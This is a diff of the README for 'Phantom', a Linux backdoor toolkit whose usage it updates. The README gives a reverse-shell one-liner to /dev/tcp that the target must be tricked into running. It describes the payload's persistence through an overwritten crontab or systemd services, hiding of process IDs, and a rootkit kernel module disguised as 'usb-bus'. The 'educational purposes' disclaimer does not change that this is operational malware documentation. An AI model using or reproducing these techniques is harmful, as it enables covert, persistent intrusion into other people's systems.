@@ -7,19 +7,19 @@ Linux machines.
 **Phantom was created for educational purposes. Stay away from illegal activities.**
 
 Phantom uses ncat on the attacker's machine to listen for incoming connections from the target's machine. At first it
-opens an ncat connection to a port and when the target's machine connects to this port it delivers the payload. The payload
-opens a new backdoor shell every 5 minutes to the attacker's machine, but to a different port than the first one. So, essentially
-you need to specify two ports. The reason for this is that this way you have more control of what to do with the backdoor shell,
-otherwise the same payload gets executed each time the target connects to your machine.
+opens an ncat connection to a port (port1) and when the target's machine connects to this port it delivers the payload. The payload
+opens a new backdoor shell every 5 minutes to the attacker's machine, but to a different port than the first one (port2). The reason for this is that this way you have more control of what to do with the backdoor shell, otherwise the same payload gets executed each time the target connects to your machine. It also creates a python3 server listening to a third port (portp) that is needed to transfer the files needed by the payload. So, essentially, you have to specify three ports.
 
 ## Usage
 
 ```
-phantom-init  [ip=][port1=][port2=]
+phantom-init  [ip=][port1=][port2=][portp=]
 ```
+
 * ip: the attacker's ip (e.g. ip=127.0.0.1)
 * port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
-* port2: the port that listens for the backdoor shells after delivering the payload (e.g. port2=9999)
+* port2: the port that listens for the backdoor shells after delivering the payload 
+* portp: the port that the python3 server listens to transfer the functions and variables needed by the payload
 
 You have to somehow make the target execute this code, so that he connects to port1:  
 **bash -c 'bash &>/dev/tcp/ip/port1 0>&1 &'**  
@@ -27,12 +27,12 @@ ip and port1 are the ones specified above.
 
 ## Files
 
-* phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the payload file.
+* phantom-init: Creates the python3 server and an ncat listening process to a predefined ip and port and redirects input to the payload file.
 
 * payload: This is the file that gets executed when the target connects to the listening ncat port1. It does the following:
-* If the user connecting is not root it overwrites the user's crontab entry with code which periodically attempts to create a
+  * If the user connecting is not root it overwrites the user's crontab entry with code which periodically attempts to create a
   backdoor shell to the port2.
-* If the user connecting is root it creates a systemd service which executes a script, continuously trying to
+  * If the user connecting is root it creates a systemd service which executes a script, continuously trying to
   create a backdoor bash shell to your machine (port2). It also creates a systemd service which executes a script,
   hiding the pids of the backdoor shells and both of the systemd services (ps aux cannot find them this way). It then
   creates and inserts a rootkit module named usb-bus which hides its files, the ones of the scripts that the systemd services use
@@ -41,8 +41,7 @@ ip and port1 are the ones specified above.
 
 * phantom-firewall: This file uses nftables. Use it only with sudo. It makes a backup of the nft ruleset in /etc/nftables.conf.bak and then
 modifies the nft ruleset so that it doesn't allow more than one connection from a target ip. This is good because the target machine will
-continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system.
-It can also undo changes made to the nft ruleset by using the argument -r | -R .
+continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system. It can also undo changes made to the nft ruleset by using the argument -r | -R .
 
 ## Order of execution
 
